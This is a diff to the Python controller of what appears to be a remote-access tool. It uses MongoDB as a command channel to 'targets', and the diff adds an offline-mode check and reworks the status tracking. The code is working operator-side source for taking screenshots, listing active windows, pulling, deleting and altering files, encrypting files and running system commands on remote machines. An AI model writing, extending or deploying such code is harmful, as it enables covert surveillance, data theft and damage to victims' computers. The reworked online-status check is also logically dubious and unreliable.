@@ -27,6 +27,7 @@ db=client['shell']
 fs=gridfs.GridFS(db)
 
 MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+IGNORE_COMMANDS_ON_NETWORK=['targetlist','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver']
 
 CWD=r""
 LAST_PATH=""
@@ -109,15 +110,13 @@ def check_online():
             last_seen=i['last_seen']
             arry=last_seen.split(" ")
             new_arry=arry[1].split(":")
-            if(i['hostname']==TARGET):
-                STATUS=i['status']
-            if ((int(minute) - int(new_arry[1]) > 5) and strr==arry[0] and int(new_arry[0])==int(hour)) or strr!=arry[0]:
+            if ((int(minute) == int(new_arry[1])) and strr==arry[0] and int(new_arry[0])==int(hour)):
                 filters={
                 "hostname":i['hostname']
                 }
                 value={
                     "$set":{
-                    "status":"Offline"
+                    "status":"Online"
                     }
                 }
                 try:
@@ -130,13 +129,15 @@ def check_online():
                 }
                 value={
                     "$set":{
-                    "status":"Online"
+                    "status":"Offline"
                     }
                 }
                 try:
                     col.update_one(filters,value)
                 except Exception as e:
                     print()
+            if(i['hostname']==TARGET):
+                STATUS=i['status']
             time.sleep(2)
             
 
@@ -147,7 +148,7 @@ def getAllTargets():
     print()
     print(Fore.BLUE+Style.BRIGHT+"\tTARGETS: ")
     print()
-    print(Fore.LIGHTBLUE_EX+Style.BRIGHT+"\t| Hostname |\tIP\t | Last_Seen\t | Status")
+    print(Fore.LIGHTBLUE_EX+Style.BRIGHT+"\t| Hostname |\t\tIP\t\t | Last_Seen\t\t | Status")
     print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------")
     for i in res:
         if i['hostname']==TARGET:
@@ -336,300 +337,310 @@ def imageShow():
 def is_directory_change_command():
     global PREV_COMMAND
     global CWD
-    global LAST_PATH
+    global LAST_PATH,STATUS,IGNORE_COMMANDS_ON_NETWORK
     a= (PREV_COMMAND.split(" "))
 
-    if a[0]=='cd':
-        if a[1] in ['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\']:
-            CWD=a[1]
-            PREV_COMMAND=a[1]
-        if (a[1])[0]=='\\':
-            print(Fore.CYAN+">>> ")
-            print("invalid navigate")
-        else:
-            if CWD and CWD[len(CWD)-1]!='\\':
-                a[1]='\\'+target_strings(a=a,index=1)
-                
-            CWD=CWD+f'{a[1]}'
-            LAST_PATH=f'{a[1]}'
-    elif a[0]=='cd..':
-            operation()
+    if STATUS=='Offline' and (a[0] not in IGNORE_COMMANDS_ON_NETWORK):
+        return
+    else:
+        if a[0]=='cd':
+            if a[1] in ['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\']:
+                CWD=a[1]
+                PREV_COMMAND=a[1]
+            if (a[1])[0]=='\\':
+                print(Fore.CYAN+">>> ")
+                print("invalid navigate")
+            else:
+                if CWD and CWD[len(CWD)-1]!='\\':
+                    a[1]='\\'+target_strings(a=a,index=1)                
+                CWD=CWD+f'{a[1]}'
+                LAST_PATH=f'{a[1]}'
+        elif a[0]=='cd..':
+                operation()
 
 
 def ActionUploader():
-    global PREV_COMMAND,CWD,MY_COMMANDS,FILENAME
+    global PREV_COMMAND,CWD,MY_COMMANDS,FILENAME,STATUS,IGNORE_COMMANDS_ON_NETWORK
     a= (PREV_COMMAND.split(" "))
     col=db['myshell']
     clearCollection()
 
-    if ((a[0] not in (MY_COMMANDS))):
+    if STATUS=='Offline' and (a[0] not in IGNORE_COMMANDS_ON_NETWORK):
         print(Fore.CYAN+">>> ")
-        print("invalid command")
-        return
-    
-
-    if a[0]=='commands' and len(a)==1:
-        print(Fore.CYAN+">>> ")
-        for i in MY_COMMANDS:
-            print(i)
+        print("Target is in Offline Mode!!!")
         print()
+        return
 
-    elif a[0]=='showimg':
-        target_element=target_strings(a,1)
-        data={
-                "action":a[0],
-                "target":TARGET,
-                "current_path":CWD,
-                "target_element":target_element,
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-        try:
-                if not (col.find_one()):
-                    col.insert_one(data)
-                    imageShow()
-                else:
-                    filters={
-                        "target":TARGET
-                        }
-                    col.delete_one(filters)
-                    col.insert_one(data)
-                    imageShow()
-        except Exception as e:
-                print(e)
-
-    elif a[0]=='snap' and len(a)==1:
-            data={
-                "action":a[0],
-                "target":TARGET,
-                "current_path":CWD,
-                "target_element":"",
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-            try:
-                if not (col.find_one()):
-                    col.insert_one(data)
-                    imageShow()
-                else:
-                    filters={
-                        "target":TARGET
-                        }
-                    col.delete_one(filters)
-                    col.insert_one(data)
-                    imageShow()
-            except Exception as e:
-                    print(e)
-
-    elif a[0]=='getfilesize':
-        target_element=target_strings(a,1)
-        data={
-                "action":a[0],
-                "target":TARGET,
-                "current_path":CWD,
-                "target_element":target_element,
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-        try:
-                if not (col.find_one()):
-                    col.insert_one(data)
-                    
-                    try:
-                        col=db['shellresult']
-                        filters={
-                            "hostname":TARGET
-                        }
-                        while True:
-                            res=col.find_one(filters)
-                            if res:
-                                print(Fore.CYAN+">>> ")
-                                print(Fore.CYAN+f"{res['result']} MB")
-                                break
-                    except Exception as e:
-                        print(e)
-                else:
-                    filters={
-                        "target":TARGET
-                        }
-                    col.delete_one(filters)
-                    col.insert_one(data)
-                    try:
-                        col=db['shellresult']
-                        filters={
-                            "hostname":TARGET
-                        }
-                        while True:
-                            res=col.find_one(filters)
-                            if res:
-                                print(Fore.CYAN+">>> ")
-                                print(Fore.CYAN+f"{res['result']} MB")
-                                break
-                    except Exception as e:
-                        print(e)
-        except Exception as e:
-                print(e)
-
-    elif a[0]=='activewindows' and len(a)==1:
-            data={
-                "action":a[0],
-                "target":TARGET,
-                "current_path":CWD,
-                "target_element":"",
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-            try:
-                if not (col.find_one()):
-                    col.insert_one(data)
-                    try:
-                        col=db['shellresult']
-                        filters={
-                            "hostname":TARGET
-                        }
-                        while True:
-                            res=col.find_one(filters)
-                            if res:
-                                print(Fore.CYAN+">>> ")
-                                for i in res['result']:
-                                    print(i)
-                                break
-                    except Exception as e:
-                        print(e)
-                else:
-                    filters={
-                        "target":TARGET
-                        }
-                    col.delete_one(filters)
-                    col.insert_one(data)
-                    try:
-                        col=db['shellresult']
-                        filters={
-                            "hostname":TARGET
-                        }
-                        while True:
-                            res=col.find_one(filters)
-                            if res:
-                                print(Fore.CYAN+">>> ")
-                                for i in res['result']:
-                                    print(i)
-                                break
-                    except Exception as e:
-                        print(e)
-            except Exception as e:
-                    print(e)
-        
-    elif a[0]=='targetinfo' and len(a)==1:
-        targetInfo()
-    elif a[0]=='refreshserver' and len(a)==1:
-        clearCollection()
-        CWD=""
-        PREV_COMMAND=""
-    
-    elif a[0]=='system':
-        systemCommandsHandeler()
-    elif a[0]=='targetlist' and len(a)==1:
-        getAllTargets()
-    elif a[0]=='shifttarget' and len(a)==2:
-        getTargetMachine(target=a[1])
-
-    elif a[0]=='getalltypefiles':
-        target_element=target_strings(a,1)
-        FILENAME=target_strings(a,1)
-        data={
-                "action":a[0],
-                "target":TARGET,
-                "current_path":CWD,
-                "target_element":target_element,
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-        try:
-            if not (col.find_one()):
-                col.insert_one(data)
-                binaryContent()
-            else:
-                filters={
-                    "target":TARGET
-                    }
-                col.delete_one(filters)
-                col.insert_one(data)
-                binaryContent()
-        except Exception as e:
-                print(e)
-        
-    
     else:
-        if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
-            action=a[0]
-            current_path=CWD
-            target=TARGET
-            if len(a)>=2:
-                target_element=target_strings(a,1)
+        if ((a[0] not in (MY_COMMANDS))):
+            print(Fore.CYAN+">>> ")
+            print("invalid command")
+            print()
+            return
+    
+
+        if a[0]=='commands' and len(a)==1:
+            print(Fore.CYAN+">>> ")
+            for i in MY_COMMANDS:
+                print(i)
+            print()
+
+        elif a[0]=='showimg':
+            target_element=target_strings(a,1)
+            data={
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "target_element":target_element,
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
+            try:
+                    if not (col.find_one()):
+                        col.insert_one(data)
+                        imageShow()
+                    else:
+                        filters={
+                            "target":TARGET
+                            }
+                        col.delete_one(filters)
+                        col.insert_one(data)
+                        imageShow()
+            except Exception as e:
+                    print(e)
+
+        elif a[0]=='snap' and len(a)==1:
                 data={
-                "action":action,
-                "target":target,
-                "current_path":current_path,
-                "target_element":target_element,
-                "new_filename":"",
-                "target_string":"",
-                "is_systemCommand":0
-                }
-            elif len(a)>=3:
-                if a[0]=='updatefile':
-                    target_element=a[1]
-                    target_string=""
-                    for i in range(2,len(a)):
-                        target_string=target_string+a[i]+" "
-                    data={
-                        "action":action,
-                        "target":target,
-                        "current_path":current_path,
-                        "target_element":target_element,
-                        "target_string":target_string,
-                        "new_filename":"",
-                        "is_systemCommand":0
-                        }
-                elif a[0]=='renamefile':
-                    target_element=a[1]
-                    new_filename=a[2]
-                    data={
-                        "action":action,
-                        "target":target,
-                        "current_path":current_path,
-                        "target_element":target_element,
-                        "new_filename":new_filename,
-                        "target_string":"",
-                        "is_systemCommand":0
-                        }
-            else:
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "target_element":"",
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
+                try:
+                    if not (col.find_one()):
+                        col.insert_one(data)
+                        imageShow()
+                    else:
+                        filters={
+                            "target":TARGET
+                            }
+                        col.delete_one(filters)
+                        col.insert_one(data)
+                        imageShow()
+                except Exception as e:
+                        print(e)
+
+        elif a[0]=='getfilesize':
+            target_element=target_strings(a,1)
+            data={
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "target_element":target_element,
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
+            try:
+                    if not (col.find_one()):
+                        col.insert_one(data)
+                    
+                        try:
+                            col=db['shellresult']
+                            filters={
+                                "hostname":TARGET
+                            }
+                            while True:
+                                res=col.find_one(filters)
+                                if res:
+                                    print(Fore.CYAN+">>> ")
+                                    print(Fore.CYAN+f"{res['result']} MB")
+                                    break
+                        except Exception as e:
+                            print(e)
+                    else:
+                        filters={
+                            "target":TARGET
+                            }
+                        col.delete_one(filters)
+                        col.insert_one(data)
+                        try:
+                            col=db['shellresult']
+                            filters={
+                                "hostname":TARGET
+                            }
+                            while True:
+                                res=col.find_one(filters)
+                                if res:
+                                    print(Fore.CYAN+">>> ")
+                                    print(Fore.CYAN+f"{res['result']} MB")
+                                    break
+                        except Exception as e:
+                            print(e)
+            except Exception as e:
+                    print(e)
+
+        elif a[0]=='activewindows' and len(a)==1:
                 data={
-                "action":action,
-                "target":target,
-                "current_path":current_path,
-                "target_string":"",
-                "target_element":"",
-                "new_filename":"",
-                "is_systemCommand":0
-                }
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "target_element":"",
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
+                try:
+                    if not (col.find_one()):
+                        col.insert_one(data)
+                        try:
+                            col=db['shellresult']
+                            filters={
+                                "hostname":TARGET
+                            }
+                            while True:
+                                res=col.find_one(filters)
+                                if res:
+                                    print(Fore.CYAN+">>> ")
+                                    for i in res['result']:
+                                        print(i)
+                                    break
+                        except Exception as e:
+                            print(e)
+                    else:
+                        filters={
+                            "target":TARGET
+                            }
+                        col.delete_one(filters)
+                        col.insert_one(data)
+                        try:
+                            col=db['shellresult']
+                            filters={
+                                "hostname":TARGET
+                            }
+                            while True:
+                                res=col.find_one(filters)
+                                if res:
+                                    print(Fore.CYAN+">>> ")
+                                    for i in res['result']:
+                                        print(i)
+                                    break
+                        except Exception as e:
+                            print(e)
+                except Exception as e:
+                        print(e)
+        
+        elif a[0]=='targetinfo' and len(a)==1:
+            targetInfo()
+        elif a[0]=='refreshserver' and len(a)==1:
+            clearCollection()
+            CWD=""
+            PREV_COMMAND=""
+    
+        elif a[0]=='system':
+            systemCommandsHandeler()
+        elif a[0]=='targetlist' and len(a)==1:
+            getAllTargets()
+        elif a[0]=='shifttarget' and len(a)==2:
+            getTargetMachine(target=a[1])
+
+        elif a[0]=='getalltypefiles':
+            target_element=target_strings(a,1)
+            FILENAME=target_strings(a,1)
+            data={
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "target_element":target_element,
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
             try:
                 if not (col.find_one()):
                     col.insert_one(data)
-                    result_for_shell(a[0])
+                    binaryContent()
                 else:
                     filters={
                         "target":TARGET
                         }
                     col.delete_one(filters)
                     col.insert_one(data)
-                    result_for_shell(a[0])
+                    binaryContent()
             except Exception as e:
-                print(e)
+                    print(e)
+        
+    
+        else:
+            if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
+                action=a[0]
+                current_path=CWD
+                target=TARGET
+                if len(a)>=2:
+                    target_element=target_strings(a,1)
+                    data={
+                    "action":action,
+                    "target":target,
+                    "current_path":current_path,
+                    "target_element":target_element,
+                    "new_filename":"",
+                    "target_string":"",
+                    "is_systemCommand":0
+                    }
+                elif len(a)>=3:
+                    if a[0]=='updatefile':
+                        target_element=a[1]
+                        target_string=""
+                        for i in range(2,len(a)):
+                            target_string=target_string+a[i]+" "
+                        data={
+                            "action":action,
+                            "target":target,
+                            "current_path":current_path,
+                            "target_element":target_element,
+                            "target_string":target_string,
+                            "new_filename":"",
+                            "is_systemCommand":0
+                            }
+                    elif a[0]=='renamefile':
+                        target_element=a[1]
+                        new_filename=a[2]
+                        data={
+                            "action":action,
+                            "target":target,
+                            "current_path":current_path,
+                            "target_element":target_element,
+                            "new_filename":new_filename,
+                            "target_string":"",
+                            "is_systemCommand":0
+                            }
+                else:
+                    data={
+                    "action":action,
+                    "target":target,
+                    "current_path":current_path,
+                    "target_string":"",
+                    "target_element":"",
+                    "new_filename":"",
+                    "is_systemCommand":0
+                    }
+                try:
+                    if not (col.find_one()):
+                        col.insert_one(data)
+                        result_for_shell(a[0])
+                    else:
+                        filters={
+                            "target":TARGET
+                            }
+                        col.delete_one(filters)
+                        col.insert_one(data)
+                        result_for_shell(a[0])
+                except Exception as e:
+                    print(e)
 
 
 def display(res):
